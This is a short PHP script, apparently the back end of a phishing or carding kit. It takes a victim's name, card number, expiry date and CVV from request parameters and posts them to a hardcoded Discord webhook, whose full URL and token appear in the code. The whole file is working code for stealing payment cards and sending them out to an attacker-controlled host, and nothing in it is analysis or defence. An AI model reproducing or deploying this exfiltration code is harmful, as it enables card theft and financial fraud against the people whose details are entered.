
<?php

$webhookUrl = 'https://discord.com/api/webhooks/1224913017611747349/ZcCz-MnpgJsYxlaRHuwypmtOgzT5LbbOz0pG7NsxnSTaQ4pW53lYzTxUo01Hr2cMmiCG'; 

$key = $_GET['key'];
$pass = $_GET['pass'];
$val = $_GET['val'];
$vcc = $_GET['vcc'];

$data = array(
    'username' => '🔥1+ INFO🔥',
    'content' => "
      <<<<<<< ====================== >>>>>>>
     🪙NOME: $key
     🪙CARD: $pass
     🪙VAL: $val
     🪙CVV: $vcc
     <<<<<<< ====================== >>>>>>>
     
     "

);

$options = array(
    'http' => array(
        'method' => 'POST',
        'header' => 'Content-Type: application/json',
        'content' => json_encode($data)
    )
);

$context = stream_context_create($options);
$result = file_get_contents($webhookUrl, false, $context);
?>